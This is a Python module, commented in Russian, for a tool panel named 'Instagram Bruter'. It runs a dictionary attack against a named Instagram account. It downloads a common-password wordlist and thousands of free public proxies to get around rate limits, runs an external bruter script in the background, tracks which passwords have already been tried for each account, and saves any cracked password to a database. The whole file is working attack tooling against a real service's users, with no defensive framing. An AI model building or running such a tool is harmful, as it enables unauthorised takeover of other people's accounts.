"""
Инструмент Instagram Bruter: перебор паролей по списку с использованием прокси.
Реальные списки паролей и прокси загружаются и сохраняются локально.
Уже проверенные пароли для аккаунта не повторяются; вывод стримится в реальном времени.
"""
import os
import re
import signal
import subprocess
import sys
import tempfile
import threading
from typing import Any

# Удаление ANSI-последовательностей (очистка экрана и т.д.) из вывода скрипта
_ANSI_ESCAPE = re.compile(r"\x1b\[[?0-9;]*[a-zA-Z]")


def _strip_ansi(line: str) -> str:
    return _ANSI_ESCAPE.sub("", line)

from .base import ToolBase

# Ленивый импорт db, чтобы не было циклических зависимостей
def _get_tried(username: str):
    from db import get_instagram_tried_passwords
    return get_instagram_tried_passwords(username)

def _add_tried(username: str, passwords: list):
    from db import add_instagram_tried_passwords
    add_instagram_tried_passwords(username, passwords)


def _save_found(username: str, password: str):
    from db import save_instagram_found
    save_instagram_found(username, password)

# Состояние текущего запуска (один запуск за раз) — для стрима вывода
# running: True только пока воркер реально выполняется (после перезапуска сервера — False)
_run_state = {"output": [], "done": False, "result": None, "error": None, "found_password": None, "running": False, "proc": None, "stop_requested": False}
_run_lock = threading.Lock()


def _run_worker(username: str, pass_path: str, proxy_path: str, mode: int, passwords_list: list) -> None:
    """Выполняет subprocess в фоне, стримит stdout в _run_state, по завершении сохраняет проверенные пароли."""
    with _run_lock:
        _run_state["output"] = []
        _run_state["done"] = False
        _run_state["result"] = None
        _run_state["error"] = None
        _run_state["found_password"] = None
        _run_state["running"] = True
        _run_state["stop_requested"] = False
        _run_state["proc"] = None
    pass_path_to_unlink = pass_path
    proxy_path_to_unlink = proxy_path
    proc = None
    try:
        cmd = [
            sys.executable,
            "-u",  # небуферизованный stdout/stderr — вывод сразу в панель
            _SCRIPT,
            "-u", username,
            "-p", pass_path,
            "-px", proxy_path,
            "-m", str(mode),
            "-nc",
        ]
        env = os.environ.copy()
        env["PYTHONUNBUFFERED"] = "1"
        proc = subprocess.Popen(
            cmd,
            cwd=_BRUTER_DIR,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            encoding="utf-8",
            errors="replace",
            stdin=subprocess.PIPE,
            env=env,
            start_new_session=True,
        )
        with _run_lock:
            _run_state["proc"] = proc
        proc.stdin.write("n\n")
        proc.stdin.flush()
        proc.stdin.close()
        for line in iter(proc.stdout.readline, ""):
            with _run_lock:
                if _run_state.get("stop_requested"):
                    break
            clean = _strip_ansi(line).rstrip()
            if clean:
                with _run_lock:
                    _run_state["output"].append(clean)
        if _run_state.get("stop_requested"):
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
            with _run_lock:
                _run_state["done"] = True
                _run_state["running"] = False
                _run_state["proc"] = None
                _run_state["error"] = "Остановлено пользователем."
            # Пометить как проверенные только реально проверенные (по Attempts из вывода)
            out_lines = _run_state.get("output") or []
            attempts = None
            for line in reversed(out_lines):
                if "Attempts:" in line:
                    parts = line.split("Attempts:", 1)
                    if len(parts) == 2:
                        try:
                            attempts = int(parts[1].strip().split()[0])
                            break
                        except (ValueError, IndexError):
                            pass
            if attempts is not None and 0 <= attempts <= len(passwords_list):
                _add_tried(username, passwords_list[:attempts])
            else:
                _add_tried(username, passwords_list)
            return
        proc.wait(timeout=300)
        out = "\n".join(_run_state["output"])
        found_pwd = None
        for line in _run_state["output"]:
            if "[+] Password:" in line:
                found_pwd = line.split("[+] Password:", 1)[-1].strip()
                break
        if found_pwd:
            _save_found(username, found_pwd)
            to_tried = [p for p in passwords_list if p != found_pwd]
        else:
            to_tried = passwords_list
        _add_tried(username, to_tried)
        with _run_lock:
            _run_state["done"] = True
            _run_state["running"] = False
            _run_state["proc"] = None
            _run_state["result"] = {"output": out, "returncode": proc.returncode}
            _run_state["found_password"] = found_pwd
    except subprocess.TimeoutExpired:
        if proc:
            try:
                proc.kill()
            except Exception:
                pass
        with _run_lock:
            _run_state["done"] = True
            _run_state["running"] = False
            _run_state["error"] = "Превышено время ожидания (5 мин). Задача прервана."
    except Exception as e:
        with _run_lock:
            _run_state["done"] = True
            _run_state["running"] = False
            _run_state["error"] = str(e)
    finally:
        with _run_lock:
            _run_state["running"] = False
            _run_state["proc"] = None
        for p in (pass_path_to_unlink, proxy_path_to_unlink):
            if p:
                try:
                    os.unlink(p)
                except OSError:
                    pass

_PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
_BRUTER_DIR = os.path.join(_PROJECT_ROOT, "tools", "Instagram Bruter")
_SCRIPT = os.path.join(_BRUTER_DIR, "instagram.py")
_WORDLIST_DIR = os.path.join(_BRUTER_DIR, "wordlists")
_WORDLIST_BUILTIN = os.path.join(_WORDLIST_DIR, "common_passwords.txt")
_WORDLIST_DOWNLOADED = os.path.join(_WORDLIST_DIR, "downloaded_passwords.txt")
_PROXY_LIST_DIR = os.path.join(_BRUTER_DIR, "proxy_lists")
_PROXY_CACHE = os.path.join(_PROXY_LIST_DIR, "cached_proxies.txt")
_WORDLIST_URL_10K = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt"
_PROXY_API = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000"
_MAX_PROXIES = 2000
# Instagram требует пароль минимум 6 символов (фактически часто 8+)
_MIN_PASSWORD_LEN = 8


class ToolInstagramBruter(ToolBase):
    @property
    def tool_id(self) -> str:
        return "instagram-bruter"

    @property
    def name(self) -> str:
        return "Instagram Bruter"

    @property
    def description(self) -> str:
        return "Проверка паролей Instagram по списку. Указывается имя аккаунта; словарь и прокси задаются в настройках инструмента."

    def _fetch_proxies(self) -> str:
        try:
            import urllib.request
            req = urllib.request.Request(_PROXY_API)
            with urllib.request.urlopen(req, timeout=15) as resp:
                text = resp.read().decode("utf-8", errors="replace").strip()
            lines = [ln.strip() for ln in text.splitlines() if ln.strip() and ":" in ln]
            return "\n".join(lines[:_MAX_PROXIES])
        except Exception:
            return ""

    def _load_cached_proxies(self) -> str:
        if os.path.isfile(_PROXY_CACHE):
            try:
                with open(_PROXY_CACHE, "r", encoding="utf-8", errors="replace") as f:
                    text = f.read().strip()
                if text:
                    return text
            except OSError:
                pass
        return ""

    def _save_proxies(self, text: str) -> None:
        os.makedirs(_PROXY_LIST_DIR, exist_ok=True)
        try:
            with open(_PROXY_CACHE, "w", encoding="utf-8") as f:
                f.write(text)
        except OSError:
            pass

    def _get_wordlist_path(self) -> str | None:
        if os.path.isfile(_WORDLIST_DOWNLOADED):
            try:
                with open(_WORDLIST_DOWNLOADED, "r", encoding="utf-8", errors="replace") as f:
                    if f.read(1):
                        return _WORDLIST_DOWNLOADED
            except OSError:
                pass
        return _WORDLIST_BUILTIN if os.path.isfile(_WORDLIST_BUILTIN) else None

    def _passwords_8plus(self, lines: list[str]) -> list[str]:
        """Только пароли от 8 символов (требование Instagram)."""
        return [ln for ln in lines if len(ln) >= _MIN_PASSWORD_LEN]

    def download_wordlist(self, merge_with_existing: bool = True) -> tuple[bool, str]:
        """Скачать список паролей (SecLists 10k), объединить с существующим без дубликатов. Только 8+ символов."""
        try:
            import urllib.request
            os.makedirs(_WORDLIST_DIR, exist_ok=True)
            existing: set[str] = set()
            if merge_with_existing and os.path.isfile(_WORDLIST_DOWNLOADED):
                try:
                    with open(_WORDLIST_DOWNLOADED, "r", encoding="utf-8", errors="replace") as f:
                        for ln in f:
                            p = ln.strip()
                            if len(p) >= _MIN_PASSWORD_LEN:
                                existing.add(p)
                except OSError:
                    pass
            req = urllib.request.Request(_WORDLIST_URL_10K)
            with urllib.request.urlopen(req, timeout=60) as resp:
                data = resp.read().decode("utf-8", errors="replace")
            new_lines = [ln.strip() for ln in data.splitlines() if ln.strip()]
            new_lines = self._passwords_8plus(new_lines)
            for p in new_lines:
                existing.add(p)
            lines = sorted(existing)
            with open(_WORDLIST_DOWNLOADED, "w", encoding="utf-8") as f:
                f.write("\n".join(lines))
            return True, f"Паролей в списке (8+ символов, без дубликатов): {len(lines)}"
        except Exception as e:
            return False, str(e)

    def refresh_proxy_list(self) -> tuple[bool, str]:
        """Загрузить прокси и объединить с существующим списком без дубликатов."""
        existing: set[str] = set()
        if os.path.isfile(_PROXY_CACHE):
            try:
                with open(_PROXY_CACHE, "r", encoding="utf-8", errors="replace") as f:
                    for ln in f:
                        ln = ln.strip()
                        if ln and ":" in ln:
                            existing.add(ln)
            except OSError:
                pass
        new_text = self._fetch_proxies()
        if new_text:
            for ln in new_text.splitlines():
                ln = ln.strip()
                if ln and ":" in ln:
                    existing.add(ln)
        if not existing:
            return False, "Нет прокси. Загрузите список или проверьте интернет."
        lines = sorted(existing)
        self._save_proxies("\n".join(lines))
        return True, f"Прокси в списке (без дубликатов): {len(lines)}"

    def run(self, params: dict[str, Any]) -> dict[str, Any]:
        username = (params.get("username") or "").strip()
        if not username:
            return {"success": False, "error": "Укажите имя пользователя или email Instagram."}

        tried = _get_tried(username)
        passlist_text = (params.get("passlist") or "").strip()
        if passlist_text:
            lines = [ln.strip() for ln in passlist_text.splitlines() if ln.strip()]
            lines = self._passwords_8plus(lines)
            lines = [p for p in lines if p not in tried]
            if not lines:
                return {"success": False, "error": "Нет паролей длиной от 8 символов или все уже проверялись для этого аккаунта. Добавьте новые пароли или обновите списки."}
            pass_path = None
            with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False, encoding="utf-8") as f:
                f.write("\n".join(lines))
                pass_path = f.name
        else:
            wl_path = self._get_wordlist_path()
            if not wl_path or not os.path.isfile(wl_path):
                return {"success": False, "error": "Нет списка паролей. Нажмите «Обновить списки» или добавьте wordlists/common_passwords.txt."}
            with open(wl_path, "r", encoding="utf-8", errors="replace") as f:
                lines = [ln.strip() for ln in f if ln.strip()]
            lines = self._passwords_8plus(lines)
            lines = [p for p in lines if p not in tried]
            if not lines:
                return {"success": False, "error": "Все пароли из списка уже проверялись для этого аккаунта. Нажмите «Обновить списки» для загрузки новых паролей."}
            pass_path = None
            with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False, encoding="utf-8") as f:
                f.write("\n".join(lines))
                pass_path = f.name
        passwords_to_try = list(lines)

        proxylist_text = (params.get("proxylist") or "").strip()
        if not proxylist_text:
            proxylist_text = self._load_cached_proxies()
        if not proxylist_text:
            proxylist_text = self._fetch_proxies()
            if proxylist_text:
                self._save_proxies(proxylist_text)
        if not proxylist_text:
            return {"success": False, "error": "Нет списка прокси. Нажмите «Обновить списки» (нужен интернет) или добавьте proxy_lists/cached_proxies.txt."}

        try:
            mode = int(params.get("mode", 2))
        except (TypeError, ValueError):
            mode = 2
        if mode not in (0, 1, 2, 3):
            mode = 2

        if not os.path.isfile(_SCRIPT):
            return {"success": False, "error": "Скрипт не найден: tools/Instagram Bruter/instagram.py"}

        proxy_path = None
        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False, encoding="utf-8") as f:
            f.write(proxylist_text)
            proxy_path = f.name

        with _run_lock:
            _run_state["output"] = []
            _run_state["done"] = False
            _run_state["result"] = None
            _run_state["error"] = None
            _run_state["running"] = True
        thread = threading.Thread(
            target=_run_worker,
            args=(username, pass_path, proxy_path, mode, passwords_to_try),
        )
        thread.start()
        return {"success": True, "started": True, "message": "Перебор запущен. Обновится вывод ниже."}

    def stop_run(self) -> tuple[bool, str]:
        """Остановить текущий перебор (включая дочерние процессы). Возвращает (успех, сообщение)."""
        with _run_lock:
            proc = _run_state.get("proc")
            if not proc or not _run_state.get("running"):
                return False, "Перебор не запущен."
            _run_state["stop_requested"] = True
        try:
            if hasattr(os, "killpg") and proc.pid:
                try:
                    pgid = os.getpgid(proc.pid)
                    os.killpg(pgid, signal.SIGKILL)
                except (ProcessLookupError, OSError):
                    try:
                        proc.kill()
                    except Exception:
                        pass
            else:
                proc.kill()
        except ProcessLookupError:
            pass
        except Exception:
            try:
                proc.terminate()
            except Exception:
                pass
        return True, "Остановка отправлена."

    def get_run_status(self) -> dict:
        """Текущий вывод и флаг завершения (для опроса с фронта)."""
        with _run_lock:
            out = list(_run_state["output"])
            done = _run_state["done"]
            result = _run_state["result"]
            err = _run_state["error"]
            found_password = _run_state.get("found_password")
            running = _run_state.get("running", False)
        return {
            "output": "\n".join(out),
            "done": done,
            "result": result,
            "error": err,
            "found_password": found_password,
            "running": running,
        }
